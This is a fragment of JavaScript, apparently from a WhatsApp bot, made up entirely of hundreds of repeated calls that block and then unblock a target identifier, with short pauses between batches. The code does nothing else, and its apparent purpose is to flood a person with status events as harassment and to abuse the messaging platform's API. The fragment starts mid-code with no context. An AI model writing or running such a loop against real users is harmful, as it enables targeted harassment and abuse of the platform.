await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
